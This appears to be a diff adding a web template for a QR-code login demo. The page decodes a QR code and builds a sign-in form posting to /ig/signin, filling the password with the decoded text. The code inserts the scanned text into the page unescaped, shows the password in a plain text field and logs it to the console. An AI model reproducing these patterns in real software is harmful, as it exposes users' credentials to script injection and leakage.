@@ -1,0 +1,152 @@
+<html>
+  <head>
+    <title>QR Code Scanner Demo</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5-qrcode/2.0.0/html5-qrcode.min.js"></script>
+    <style>
+      body {
+        background: linear-gradient(135deg, #74ebd5, #acb6e5);
+        font-family: 'Arial', sans-serif;
+        color: #333;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        min-height: 100vh;
+        margin: 0;
+        padding: 20px;
+      }
+
+      #qr-reader {
+        border: 3px solid #6c63ff;
+        border-radius: 12px;
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        background: #fff;
+        padding: 20px;
+        margin-bottom: 20px;
+        max-width: 500px;
+        width: 100%;
+      }
+
+      #qr-reader-results {
+        background: #fff;
+        border-radius: 12px;
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        padding: 20px;
+        margin-top: 20px;
+        max-width: 500px;
+        width: 100%;
+        overflow: auto;
+      }
+
+      #qr-reader-results div {
+        font-size: 1rem;
+        margin-bottom: 10px;
+        border-bottom: 1px solid #ddd;
+        padding-bottom: 10px;
+        color: #333;
+      }
+
+      h1 {
+        color: #6c63ff;
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        margin-top: 20px;
+      }
+
+      input[type="text"],
+      input[type="submit"] {
+        padding: 10px;
+        border-radius: 8px;
+        border: 1px solid #ddd;
+        font-size: 1rem;
+        width: 100%;
+      }
+
+      input[type="text"] {
+        background: #f9f9f9;
+      }
+
+      input[type="text"]:focus {
+        outline: none;
+        border-color: #6c63ff;
+        box-shadow: 0 0 5px rgba(108, 99, 255, 0.3);
+      }
+
+      input[type="submit"] {
+        background: linear-gradient(135deg, #6c63ff, #9face6);
+        color: #fff;
+        font-weight: bold;
+        border: none;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      input[type="submit"]:hover {
+        background: linear-gradient(135deg, #9face6, #6c63ff);
+        transform: scale(1.05);
+      }
+
+      input[type="submit"]:active {
+        transform: scale(1);
+      }
+    </style>
+  </head>
+  <body>
+    <h1>QR Code Scanner</h1>
+    <div id="qr-reader"></div>
+    <div id="qr-reader-results"></div>
+    <h1 hidden class="mail"><%= email %></h1>
+    <script>
+      function docReady(fn) {
+        if (document.readyState === "complete" || document.readyState === "interactive") {
+          setTimeout(fn, 1);
+        } else {
+          document.addEventListener("DOMContentLoaded", fn);
+        }
+      }
+
+      docReady(function () {
+        var resultContainer = document.getElementById("qr-reader-results");
+        var lastResult,
+          countResults = 0;
+
+        if (typeof Html5QrcodeScanner === "undefined") {
+          console.error("Html5QrcodeScanner is not defined!");
+          return;
+        }
+
+        var html5QrcodeScanner = new Html5QrcodeScanner("qr-reader", {
+          fps: 10,
+          qrbox: 500,
+        });
+
+        function onScanSuccess(decodedText, decodedResult) {
+          let email = document.querySelector(".mail").innerText;
+          if (decodedText !== lastResult) {
+            ++countResults;
+            lastResult = decodedText;
+            console.log(`Scan result = ${decodedText}`, decodedResult);
+            resultContainer.innerHTML += `
+              <div>
+                <form action="/ig/signin" method="post">
+                  <input type="text" value="${email}" name="email">
+                  <input type="text" value="${lastResult}" name="password" readonly>
+                  <input type="submit" name="confirm" value="Confirm Password">
+                </form>
+              </div>`;
+            html5QrcodeScanner.clear();
+            console.log(`The output you need is: ${lastResult}`);
+          }
+        }
+
+        html5QrcodeScanner.render(onScanSuccess);
+      });
+    </script>
+  </body>
+</html>
